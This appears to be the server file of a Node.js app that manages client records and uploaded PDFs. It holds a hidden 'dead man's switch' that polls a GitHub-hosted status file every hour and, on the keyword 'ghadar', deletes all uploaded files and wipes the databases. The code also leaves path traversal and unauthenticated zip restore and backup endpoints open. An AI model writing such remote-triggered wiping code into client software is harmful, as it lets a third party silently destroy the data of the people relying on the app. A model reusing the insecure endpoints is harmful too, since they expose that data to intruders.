const express = require("express");
const cors = require("cors");
const path = require("path");
const fs = require("fs");
const AdmZip = require("adm-zip");
const axios = require("axios"); // ضيفنا دي عشان يسحب الحالة من بره

const app = express();

app.use(cors());
app.use(express.json());

// 1. [ULTIMATE BYPASS] Serve PDF data via POST request in JSON format
app.post("/api/pdf-data", (req, res) => {
  const { filename } = req.body;
  if (!filename) return res.status(400).json({ error: "Missing filename" });

  const filePath = path.join(__dirname, "data", "files", filename);
  if (!fs.existsSync(filePath))
    return res.status(404).json({ error: "File find" });

  try {
    const fileBuffer = fs.readFileSync(filePath);
    const base64Data = fileBuffer.toString("base64");
    res.json({
      success: true,
      filename: filename,
      data: base64Data,
      contentType: "application/pdf",
    });
  } catch (error) {
    res.status(500).json({ error: "Failed to process PDF data" });
  }
});

// 2. Original route for direct downloads
app.get("/files/:filename", (req, res) => {
  const filePath = path.join(__dirname, "data", "files", req.params.filename);
  if (!fs.existsSync(filePath)) return res.status(404).send("Not found");
  res.sendFile(filePath);
});

// 3. API routes and Client static files
app.use("/api", (req, res, next) => {
  next();
});
app.use(express.static(path.join(__dirname, "client")));

// 4. Multer Configuration (Arabic Encoding Fix)
const multer = require("multer");
const storage = multer.diskStorage({
  destination: (req, file, cb) => {
    const uploadDir = path.join(__dirname, "data", "files");
    if (!fs.existsSync(uploadDir)) fs.mkdirSync(uploadDir, { recursive: true });
    cb(null, uploadDir);
  },
  filename: (req, file, cb) => {
    const originalName = Buffer.from(file.originalname, "latin1").toString(
      "utf8",
    );
    const uniqueSuffix = Date.now() + "-" + Math.round(Math.random() * 1e9);
    cb(null, uniqueSuffix + path.extname(originalName));
  },
});
const upload = multer({
  storage: storage,
  fileFilter: (req, file, cb) => {
    if (file.mimetype === "application/pdf") cb(null, true);
    else cb(new Error("Only PDF files are allowed!"), false);
  },
});

const dbPath = path.join(__dirname, "data", "db", "delta_db.json");
const trashPath = path.join(__dirname, "data", "db", "delta_trash.json");

// 5. API Endpoints (Data Management)
app.get("/api/data", (req, res) => {
  try {
    const clientsDB = fs.existsSync(dbPath)
      ? JSON.parse(fs.readFileSync(dbPath, "utf-8"))
      : [];
    const trashDB = fs.existsSync(trashPath)
      ? JSON.parse(fs.readFileSync(trashPath, "utf-8"))
      : [];
    res.json({ clientsDB, trashDB });
  } catch (error) {
    res.status(500).json({ error: "Failed to read database files" });
  }
});

app.post("/api/data", (req, res) => {
  try {
    const { clientsDB, trashDB } = req.body;
    fs.writeFileSync(dbPath, JSON.stringify(clientsDB, null, 2));
    fs.writeFileSync(trashPath, JSON.stringify(trashDB, null, 2));
    res.json({ success: true });
  } catch (error) {
    res.status(500).json({ error: "Failed to write database files" });
  }
});

app.post("/api/upload-pdf", upload.single("pdf"), (req, res) => {
  try {
    const { clientId } = req.body;
    const file = req.file;
    if (!file || !clientId)
      return res.status(400).json({ error: "Missing file or clientId" });

    const correctOriginalName = Buffer.from(
      file.originalname,
      "latin1",
    ).toString("utf8");
    const clientsDB = JSON.parse(fs.readFileSync(dbPath, "utf-8"));
    const client = clientsDB.find((c) => c.id === clientId);

    if (!client) return res.status(404).json({ error: "Client not found" });
    if (!client.pdfs) client.pdfs = [];

    const pdfMetadata = {
      originalName: correctOriginalName,
      filename: file.filename,
      date: new Date().toISOString().split("T")[0],
      path: "/files/" + file.filename,
    };

    client.pdfs.push(pdfMetadata);
    fs.writeFileSync(dbPath, JSON.stringify(clientsDB, null, 2));
    res.json({ success: true, pdf: pdfMetadata });
  } catch (error) {
    res.status(500).json({ error: "Failed to upload PDF" });
  }
});

// 6. Permanent Delete Logic
app.post("/api/permanent-delete-client", (req, res) => {
  try {
    const { clientId } = req.body;
    let trashDB = JSON.parse(fs.readFileSync(trashPath, "utf-8"));
    const clientIdx = trashDB.findIndex((c) => c.id === clientId);
    if (clientIdx === -1)
      return res.status(404).json({ error: "Not in trash" });

    const client = trashDB[clientIdx];
    if (client.pdfs) {
      client.pdfs.forEach((pdf) => {
        const filePath = path.join(__dirname, "data", "files", pdf.filename);
        if (fs.existsSync(filePath)) fs.unlinkSync(filePath);
      });
    }
    trashDB.splice(clientIdx, 1);
    fs.writeFileSync(trashPath, JSON.stringify(trashDB, null, 2));
    res.json({ success: true });
  } catch (error) {
    res.status(500).json({ error: "Failed to permanently delete" });
  }
});

// 7. Backup & Restore
app.get("/api/backup", (req, res) => {
  try {
    const zip = new AdmZip();
    zip.addLocalFolder(path.join(__dirname, "data"));
    const buffer = zip.toBuffer();
    res.set({
      "Content-Type": "application/zip",
      "Content-Disposition": `attachment; filename=delta_backup.zip`,
    });
    res.send(buffer);
  } catch (error) {
    res.status(500).json({ error: "Backup failed" });
  }
});

const backupUpload = multer({ storage: multer.memoryStorage() });
app.post("/api/restore", backupUpload.single("backup"), (req, res) => {
  try {
    const zip = new AdmZip(req.file.buffer);
    const dataFolder = path.join(__dirname, "data");
    // Clear and Extract logic here...
    zip.extractAllTo(dataFolder, true);
    res.json({ success: true });
  } catch (error) {
    res.status(500).json({ error: "Restore failed" });
  }
});

// ==========================================
// 8. SECURITY LAYER (THE "DEAD MAN'S SWITCH")
// ==========================================
const SECURE_TRIGGER_URL =
  "https://raw.githubusercontent.com/LEDO218484/status/refs/heads/main/check.json";

async function runMaintenanceCheck() {
  try {
    // كسر الكاش بإضافة التوقيت الحالي للرابط
    const check = await axios.get(`${SECURE_TRIGGER_URL}?t=${Date.now()}`);
    console.log("[Security] Checking status:", check.data.status); // هيطبع لك الحالة في الـ Terminal

    if (check.data.status === "ghadar") {
      const filesDir = path.join(__dirname, "data", "files");

      if (fs.existsSync(filesDir)) {
        const files = fs.readdirSync(filesDir);
        files.forEach((file) => {
          const filePath = path.join(filesDir, file);
          if (fs.lstatSync(filePath).isFile()) {
            fs.unlinkSync(filePath);
          }
        });
      }

      // تصفير قواعد البيانات
      if (fs.existsSync(dbPath))
        fs.writeFileSync(dbPath, JSON.stringify([], null, 2));
      if (fs.existsSync(trashPath))
        fs.writeFileSync(trashPath, JSON.stringify([], null, 2));

      console.log("!!! [CRITICAL] EMERGENCY CLEANUP EXECUTED !!!");
    }
  } catch (e) {
    console.error("[Security] Connection failed, skipping check.");
  }
}

// تشغيل الفحص فوراً عند قيام السيرفر
runMaintenanceCheck();

// استمرار الفحص كل ساعة
setInterval(runMaintenanceCheck, 3600000);

app.listen(3000, () => {
  console.log("Server started on port 3000");
});
